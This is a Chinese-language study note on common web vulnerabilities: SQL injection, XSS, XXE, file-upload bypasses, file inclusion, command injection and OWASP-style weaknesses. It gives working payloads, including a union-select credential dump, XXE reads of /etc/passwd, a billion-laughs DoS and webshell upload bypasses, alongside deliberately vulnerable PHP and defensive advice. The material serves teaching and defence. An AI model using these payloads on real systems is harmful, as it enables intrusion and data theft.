# Web 攻击与防御

## HTTP 和 Web 基础

[计算机网络_应用层]()

### Web

万维网（World Wide Web, WWW）简称 Web，是使用超文本传输协议（HTTP）传输网站页面和资源的一种网络应用层表现形式。  

Web 的基本结构可以简化为：

Web 浏览器 $\longleftrightarrow$ Web 服务器 $\longleftrightarrow$ 数据库服务器

* 常见的 Web 浏览器：Google Chrome、Mozilla Firefox、MicroSoft Edge、Opera 等。
* 提供 Web 服务的应用：Apache HTTP Server、Apache Tomcat、Nginx、IIS 等。
* 提供数据库服务的应用：Oracle、MySQL、Access、Redis、MongoDB、SQLite 等。

### HTTP 协议

超文本传输协议

get 和 post     

Session 和 Cookie

### HTML 与 CSS 基础

参考：[HTML 与 CSS]()

### PHP 基础

参考：[PHP]()  

## SQL 注入 

### 基于报错注入

**漏洞成因**   
未对 SQL 查询语句进行特殊字符的转义以及敏感词的过滤。

**漏洞利用**   

```sql
注入单引号、双引号、单引号加右括号等判断是否存在注入点

order by 3 %23
判断有多少列

union select 1,2,3 %23
判断数据回显位置

union select 1,user(),database() %23
显示出登录用户和数据库名

union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23
查询所有数据库名称

union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 %23
查询 security 库中所有表名

union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users' ),3 %23
查询 users 表中所有列名

union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) %23
查所有 username 和 password 字段
```

**防护**    
将数据与命令、查询分割开。

1. 最安全的策略，使用安全的 API 进行数据的存取和读写，避免将查询语句和数据连接起来。
2. 使用白名单的服务器输入验证。
3. 对查询语句的特殊字符进行转义，譬如 PHP 中使用函数 `mysqli _real_escape()` 函数。

<!--### 基于 HTTP header 与 Cookie 注入

### 盲注-->

## XSS 漏洞

攻击者能在被攻击者的浏览器中执行脚本，并劫持会话、破坏网站或将用户重定向到恶意站点。

### 反射型 XSS

最简单的：

```php
<?php
    $str = $_GET['name'];
    echo '<p>' . $str . '欢迎您 </p>';
?>
```

注入 `?str=<script>alert(1)</script>`，可使得前端弹窗。

另一种是通过表单注入 XSS，比如：

```php
// demo.php
<?php
    $str = $_GET['input'];
?>
<html>
    <form action=demo.php  method="get">
        <input name="input" value="'.$str.'"/>
        <input type="submit" value="submit"/>
    </form>
</html>
```

注入 `test"><script>alert(1)</script>`，提前将 <" 闭合，则可在前端弹窗。

使用 `htmlspecialchars()` 函数可以使得下列特殊字符被转义成 HTML 实体：

* & $\longrightarrow$ \&amp
* " $\longrightarrow$ \&quot
* < $\longrightarrow$ \&lt
* \> $\longrightarrow$ \&gt
* ' $\longrightarrow$ \&apos（默认不转义）

可一定程度上防止 XSS，但无法完全防御，使用 onclick、oninput、onmouseover 等 JS 事件依然可以完成弹窗，例如：

```php
// demo.php
<?php
    $str = htmlspecialchars($_GET['input']);
?>
<html>
    <form action=demo.php  method="get">
        <input name="input" value='".$str."'/>
        <input type="submit" value="submit"/>
    </form>
</html>
```
`$str` 被 `htmlspecialchars()` 函数转义，但是使用 payload：`test' onmouseover='alert(1)'` 依然可以完成弹窗。

### 存储型 XSS

将脚本注入并存储在数据库中，当前端读取这段数据时执行脚本。常见的发生场景如评论区、留言板、个性签名等。

### DOM 型 XSS

**防护**   
使用 `htmlentities(string, flags, character-set, double_encode)` html 实体转换函数：

* string 表示要转换的字符串
* flags 表示如何处理引号、无效的编码以及使用哪种文件类型
* character-set 要使用的字符集
* double_encode 是否编码已经存在 html 实体类


## XXE 漏洞

XML 是一种常用于存储和传输数据的标记语言，与 HTML 类似是通过标签组成文件的内容，但是 XML 的标签没有被预定义，而是用户自行定义标签。     
XML 外部实体即在 XML 文件中引用外部的资源。

### 文件读取

XML 定义外部实体的用法如下：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<message>
    <user>&xxe;</user>
</message>
```

上述 XML 引用外部实体 file:///etc/passwd，则将读取该文件的内容。    

### 拒绝服务

使用 XML 外部实体可以实现 DoS 攻击，例如：

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

lol 是一个实体，内容为“lol”，lol2 实体引用 10 个 lol 实体，lol3 实体又引用了 10 个 lol2 实体，一直到 lol9，如此就会引用上亿个 lol 实体，XML 解析器将整个结构保存在内存中造成 DoS 攻击。

也可以使用 /dev/random 造成 DoS 攻击：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
<message>
    <user>&xxe;</user>
</message>
```
/dev/random 是 Linux 系统中提供的随机伪设备，提供永不为空的随机字节数据流。

**防护**    

* 尽可能使用简单的数据格式存储和和传输数据，如 json，避免对敏感数据进行序列化
* 及时修复和更新应用程序或操作吸引使用的 XML 处理器和库
* 在 XML 解析器中禁用外部实体和 DTD 进程
* 在服务器端使用白名单进行过滤和验证

## 文件上传漏洞

### 前端检验

```js
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    // 定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    // 提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    // 判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

将 Webshell 后缀改为 .jpg，上传 Webshell，使用 Burpsuite 抓包，修改文件后缀为 .php 即可绕过。

### MIME 类型检验

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
?>
```

`if (($_FILES['upload_file']['type'] == 'image/jpeg'))` 表明使用了 MIME 检测文件类型。上传 Webshell，使用 Burpsuite 抓包，修改 Content-type 类型，使脚本能够绕过。


### 黑名单绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);// 删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); // 转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);// 去除字符串::$DATA
        $file_ext = trim($file_ext); // 收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>
```

黑名单过滤了 .asp .php .aspx .jsp 四种后缀，而 PHP 文件的后缀名除了 .php 外，还有 .pht | .phpt | .phtml | .php3 | .php4 | .php5 | .php6 等，可利用不常见的后缀名绕过黑名单。  
修改文件的后缀名为 .php4 即可绕过黑名单。

### .htaccess 绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);// 删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); // 转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);// 去除字符串::$DATA
        $file_ext = trim($file_ext); // 收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>
```

此段代码也使用黑名单过滤上传的文件，过滤的文件后缀很多，无法通过不常见的后缀名绕过。但是可以通过上传 apache 的 .htaccess 文件：

``` htaccess
<FilesMatch "upload.png">  
    SetHandler application/x-httpd-php  
</FilesMatch>
```

该 .htaccess 文件可以将 .png 后缀的文件作为 PHP 文件解析。

### 大小写绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);// 删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);// 去除字符串::$DATA
        $file_ext = trim($file_ext); // 首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
}
?>
```

此段代码仍使用黑名单过滤，也过滤了 .htaccess 文件。审查代码发现没有将文件名转化为小写，故可以将后缀名改为大小写绕过黑名单，如 .PHp，即可绕过。

### 空格绕过

```php
<?php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);// 删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); // 转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);// 去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
?>
```

此段代码仍使用黑名单过滤，也过滤了 .htaccess 文件，审查代码发现可以使用空格绕过黑名单，因为在 Windows 系统下，后缀名之后的空格会被无视。上传 Webshell 文件，使用 Burpsuite 抓包，把文件的后缀名后加一个空格，即可绕过。

**防护**

## 文件包含漏洞

PHP 有四种文件包含方式：

* `include`
* `include_once`
* `require`
* `require_once`

其中 `include` 和 `require` 的区别是，二者处理错误的方式不同，前者生成一个警告，出错后脚本继续执行，后者生成一个致命错误，脚本停止执行。  
后面带上 `_once` 的作用是如果之前已经包含了该文件，则不会再次包含，即防止多次包含同一个文件。  

### 本地文件包含

PHP 包含文件时不会在意文件的类型，都会当作 PHP 代码执行，故可以通过改变包含的文件请求来读取系统中的敏感文件，譬如代码：

```php
<?php
    include($_GET['file']);
?>
```

URL 注入 `?file=/etc/passwd`，可读取系统的密码文件。
通过 PHP 伪协议 php://filter 可进行任意文件的读取。

### 远程文件包含

若 PHP 配置中 allow_url_include、allow_url_fopen 选项配置为 on，则可直接进行远程文件包含。如在 URL 注入：`?file=http://192.168.17.138/code.txt` 可直接远程读取该文件。

## 代码执行漏洞

**漏洞成因**     
PHP 中可以调用系统命令函数：

* `system()`：执行系统命令，输出执行结果。
* `passthru()`：与 `system()`函数相似。
* `exec()`：执行系统命令，无回显，返回最后一行结果。
* `shell_exec()`：执行系统命令，返回完整的输出结果。
* `popen(command, mode)`：command 为执行的命令，mode 规定连接模式，可以是 r（只读）、w（只写）等。
* `proc_open()`：不直接返回执行结果，返回一个文件指针。
* `pcntl_exec()`：执行发生错误返回 FALSE，无错误不返回。

命令执行的例子：

```php
<?php
    $ip = $_GET["ip"];
    $command = "ping -c 3 $ip";
    system("$command");
?>
```

以上代码存在代码执行漏洞，攻击者可以使用命令连接符连接自己想要执行的系统命令，如注入 `?ip = 127.0.0.1 | pwd` 可显示当前网页在服务器中的路径。

**防护**

* `escapeshellarg()` 函数：给字符串增加一个单引号且能够引用或者转码任何已经存在的单引号，以确保能够直接将一个字符串传入 shell 函数。
* `escapeshellcmd()` 函数：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，保证用户输入的数据在传送到 `exec()` 函数或执行操作符前进行转义。
* 黑名单过滤特殊字符或替换字符。

## CSRF 漏洞

## SSRF 漏洞

## 不安全的反序列化

## 失效的身份验证

错误的使用应用程序的身份验证和会话管理，使攻击者能够破译密码、密钥或会话令牌，或利用其他缺陷暂时性或永久性冒充他人身份。

**漏洞成因**

* 允许凭证填充（撞库攻击）
* 允许暴力破解或自动攻击
* 允许默认的、弱的口令，如 admin
* 使用弱的或失效的验证凭证恢复程序、忘记密码程序，例如“基于知识的问答”
* 使用明文或弱散列算法加密存储密码
* 缺少或失效的多因素身份验证
* 在 URL 中暴露会话 ID
* 登录成功后不更新会话
* 用户不活跃时，会话 ID 没有失效

**防护**

* 多因素验证，防止凭证填充、暴力破解和自动攻击以及被盗凭证再利用攻击
* 不使用任何默认凭据进行部署，尤其管理员账户
* 执行弱密码检查，设置合适的密码长度、复杂性和轮换策略
* 限制或增加登录失败延时，记录失败信息，检测凭据填充、暴力破解等攻击并提醒管理员
* 使用安全的会话管理器，在登录后生成高度复杂的新随机会话 ID，避免会话 ID 暴露在 URL

## 敏感信息泄露

**漏洞成因**    
许多 Web 应用以及 API 无法保护敏感数据，没有对其进行加密，如财务数据、医疗信息等个人敏感信息。导致攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份窃取或其他犯罪行为。   

**防护**   
应对下面三种敏感数据进行加密：

* 传输过程的数据（不能明文传输）
* 存储的数据（不能明文存储）
* 浏览器交互的数据

措施：
* 对系统处理、传输和存储的数据进行分类，根据分类进行访问控制
* 熟悉与敏感数据保护相关的法律和规章
* 对于没有必要存在的敏感数据，应尽快清除，或使用 PCI DSS 进行标记和拦截
* 确保存储的敏感数据被加密
* 确保使用密码专用算法存储密码，如 PBKDF2、bcrypt、script 等
* 确保使用最新的、安全系数高的加密算法，并管理好密钥
* 确保在传输过程的数据被加密，如使用 TLS。确保数据加密被强制执行，如使用 HTTP 严格安全传输协议 HSTS
* 禁止缓存包含敏感数据的响应

## 失效的访问控制

**漏洞成因**  
未对用户实施恰当的访问控制，攻击者可以访问未经授权的功能或数据：
* 访问其他用户账户
* 查看敏感文件
* 修改其他用户的数据
* 更改访问权限

**防护**

* 除公有资源外，默认为“拒绝访问”
* 使用一次性访问控制机制，最小化跨源资源共享的使用
* 特别的业务应用访问限制应由领域模型强制执行
* 禁用 Web 服务器目录列表，确保文件元数据和备份文件不在 Web 的根目录中
* 记录失败的访问控制并提醒管理员
* 在用户注销后，会话的 ID 应当失效，无状态的 JWT 令牌应该是短暂的，使攻击者的攻击机会窗口最小化

## 安全配置错误

**漏洞成因**      

* 不安全的默认配置
* 不完整的临时配置
* 开源云存储
* 错误的 HTTP 报头配置
* 包含敏感信息的详细错误信息

**防护**     
不仅要对操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级。